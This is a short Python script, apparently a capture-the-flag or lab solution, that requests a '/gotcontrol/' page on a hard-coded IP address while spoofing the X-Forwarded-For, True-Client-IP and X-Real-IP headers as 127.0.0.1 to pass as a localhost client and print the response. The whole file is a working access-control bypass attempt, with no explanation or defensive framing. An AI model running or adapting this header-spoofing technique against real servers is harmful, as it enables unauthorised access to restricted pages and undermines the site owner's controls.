import requests
session=requests.Session()
url="http://35.197.254.240/gotcontrol/"


custom_headers={"X-Forwarded-For":"127.0.0.1","True-Client-IP":"127.0.0.1","X-Real-IP":"127.0.0.1"}
response=session.get(url,headers=custom_headers)
content=response.text
headers=response.headers
print(content)


